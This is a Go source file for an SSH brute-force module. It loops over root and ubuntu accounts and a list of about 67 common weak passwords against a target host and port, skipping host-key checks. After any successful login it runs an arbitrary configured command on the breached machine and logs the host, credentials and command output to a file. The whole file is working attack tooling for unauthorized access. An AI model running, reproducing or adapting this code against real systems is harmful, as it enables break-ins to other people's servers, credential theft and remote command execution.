package brute

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
)
import "bruteforcer/Global"

var sshBruteUsers = []string{"root", "ubuntu", "roots"}
var sshBrutePwds = []string{"123456",
	"123456789",
	"12345678",
	"654321",
	"1234567890",
	"woaini",
	"password",
	"zxcvbnm",
	"987654321",
	"1qaz2wsx",
	"qazwsx",
	"qwqwqw",
	"123123",
	"super123",
	"admin",
	"admin1234",
	"admin12345",
	"admin123",
	"root",
	"pass123",
	"pass@123",
	"111111",
	"123",
	"1",
	"admin@123",
	"admin123!@#",
	"P@ssw0rd!",
	"P@ssw0rd",
	"Passw0rd",
	"qwe123",
	"test",
	"test123",
	"123qwe",
	"123qwe!@#",
	"123321",
	"666666",
	"a123456.",
	"123456~a",
	"123456!a",
	"000000",
	"00000",
	"8888888",
	"!QAZ2wsx",
	"abc123",
	"abc123456",
	"1qaz@WSX",
	"a12345",
	"Aa1234",
	"Aa1234.",
	"Aa12345",
	"a123456",
	"a123123",
	"Aa123123",
	"Aa123456",
	"Aa12345.",
	"sysadmin",
	"system",
	"1qaz!QAZ",
	"2wsx@WSX",
	"qwe123!@#",
	"Aa123456!",
	"A123456s!",
	"sa123456",
	"1q2w3e",
	"Charge123",
	"Aa123456789",
	"lsofadmin37695382"}

func SSHBrute(host string, port string, file *os.File) {
	isSuc := false
	if Global.DBG {
		fmt.Printf("%v开始执行\n", host+":"+port)
	}
	for _, user := range sshBruteUsers {
		for _, pwd := range sshBrutePwds {
			if !isSuc {
				go func() {
					sshConf := &ssh.ClientConfig{
						User: user,
						Auth: []ssh.AuthMethod{
							ssh.Password(pwd),
						},
						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
					}
					sshdial, err := ssh.Dial("tcp", host+":"+port, sshConf)
					if err == nil { //如果密码正确

						defer func(sshdial *ssh.Client) { // 关闭ssh通道
							err := sshdial.Close()
							if err != nil {
							}
						}(sshdial)
						//密码正确
						session, sessionerr := sshdial.NewSession()
						if sessionerr == nil {
							defer func(session *ssh.Session) { // 关闭session
								err := session.Close()
								if err != nil {
								}
							}(session)

							shellOutput, runerr := session.CombinedOutput(Global.CMD)
							if runerr == nil {
								if isSuc {
									return
								}

								sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user, pwd, Global.CMD, string(shellOutput))
								println(sucOutStr)                        // 输出成功信息
								_, _ = file.WriteString(sucOutStr + "\n") // 打印信息
								isSuc = true
							}
						}

					} else {
						if Global.DBG {
							OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user, pwd)
							println("err" + OutStr)
							println(err.Error())
						}
					}
				}()
			}

		}
	}
}
